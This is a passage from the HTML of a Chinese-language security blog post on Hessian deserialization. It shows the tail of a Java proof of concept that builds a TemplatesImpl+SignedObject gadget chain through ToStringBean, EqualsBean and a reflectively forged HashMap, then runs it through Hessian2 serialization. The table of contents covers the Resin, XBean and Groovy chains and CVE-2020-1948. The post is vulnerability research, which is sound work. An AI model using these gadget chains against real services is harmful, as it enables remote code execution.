class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);  </span><br><span class="line">        Hessian2_Deserial(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">        hessian2Output.writeObject(o);  </span><br><span class="line">        hessian2Output.flushBuffer();  </span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RPC%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">RPC协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">简单使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">Hessian反序列化漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Dubbo-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1948%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resin%E9%93%BE"><span class="toc-number">6.</span> <span class="toc-text">Resin链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XBean%E9%93%BE"><span class="toc-number">7.</span> <span class="toc-text">XBean链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="toc-number">7.1.</span> <span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy%E9%93%BE"><span class="toc-number">8.</span> <span class="toc-text">Groovy链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-3"><span class="toc-number">8.1.</span> <span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl-SignedObject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.</span> <span class="toc-text">TemplatesImpl+SignedObject二次反序列化</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Hessian反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Hessian反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hessian反序列化&body=Check out this article: https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Hessian反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Hessian反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
